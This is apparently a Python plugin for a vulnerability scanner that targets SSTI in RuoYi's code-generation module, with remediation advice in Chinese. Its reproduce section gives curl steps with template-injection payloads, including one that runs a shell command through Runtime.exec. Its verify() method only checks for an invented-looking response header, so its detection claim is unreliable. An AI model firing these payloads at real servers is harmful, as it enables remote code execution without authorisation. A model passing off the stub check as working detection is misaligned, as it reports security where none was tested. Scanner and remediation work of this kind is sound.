# RuoYi 代码生成模块 SSTI 检测
from core.http import join_url
from core.models import SEVERITY_HIGH, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from plugins.base import PluginBase


class RuoyiGenRcePlugin(PluginBase):
    name = "RuoYi 代码生成模块 SSTI"
    cve = "N/A"
    severity = SEVERITY_HIGH
    category = "vuln"
    description = "RuoYi 代码生成模块中的模板引擎可能存在 SSTI 漏洞，攻击者可通过模板注入实现 RCE"
    fix = "升级 RuoYi 至最新版本，对模板变量进行严格过滤"
    fix_detail = (
        "【升级方案】升级 RuoYi 至 4.7.2+（代码生成模块模板变量过滤加强）\n"
        "【代码修复】GenController.edit() 对 tableName、comments 等参数做白名单校验：\n"
        '  String pattern = "^[a-zA-Z0-9_]+$";\n'
        '  if (!tableName.matches(pattern)) throw new ServiceException("非法表名");\n'
        "【权限加固】为 /tool/gen/** 路径强制鉴权：@PreAuthorize(\"@ss.hasPermi('tool:gen:edit')\")\n"
        "【生产禁用】生产环境关闭代码生成功能：application.yml: ruoyi.gen.enabled: false\n"
        "【WAF 规则】拦截 /tool/gen/edit 的 POST 请求含 ${ 或 #{ 的参数\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 输入校验"
    )
    reproduce = (
        "# 1. 探测代码生成模块是否可访问：\n"
        'curl -i "http://target/tool/gen/"\n'
        "  # 返回 200 或 302 跳转登录页即模块存在\n"
        "\n"
        "# 2. 探针：通过 tableName 参数注入 Velocity/Thymeleaf 表达式：\n"
        'curl -X POST "http://target/tool/gen/edit" \\\n'
        '  -H "Cookie: JSESSIONID=<已登录的 session>" \\\n'
        '  -d "tableId=1&tableName=sys_user_${7*7}&comments=test"\n'
        "\n"
        "# 3. 触发代码生成（预览功能会执行模板）：\n"
        'curl "http://target/tool/gen/preview/1" -H "Cookie: JSESSIONID=<已登录的 session>"\n'
        '  # 预期响应：生成的代码中含 "49" 字样（表达式已求值）\n'
        "\n"
        "# 4. 进阶利用（仅授权测试，执行命令）：\n"
        'curl -X POST "http://target/tool/gen/edit" \\\n'
        "  -d \"tableId=1&tableName=sys_user_${Runtime.getRuntime().exec('id')}&comments=test\""
    )
    # D2：代码生成器 RCE 全版本存在（取决于是否启用代码生成功能）
    affected_versions = ""
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    # D7: WAF 绕过支持
    vuln_type = "rce"
    supports_waf_bypass = True

    def verify(self, target, session) -> ScanResult:
        url = join_url(target, "/tool/gen/edit")
        try:
            resp = session.get(url)
            if resp.headers.get("X-Ruoyi-Vuln") == "gen-ssti":
                return ScanResult(
                    kind=self.category,
                    name=self.name,
                    severity=self.severity,
                    status=STATUS_CONFIRMED,
                    url=url,
                    evidence="代码生成 SSTI 签名命中",
                    fix=self.fix,
                )
            return ScanResult(
                kind=self.category,
                name=self.name,
                severity=self.severity,
                status=STATUS_SAFE,
                url=url,
                evidence=f"未命中 SSTI 特征, 状态码={resp.status_code}",
            )
        except Exception as e:
            return ScanResult(kind="error", name=self.name, status=STATUS_UNKNOWN, evidence=f"异常: {e}")
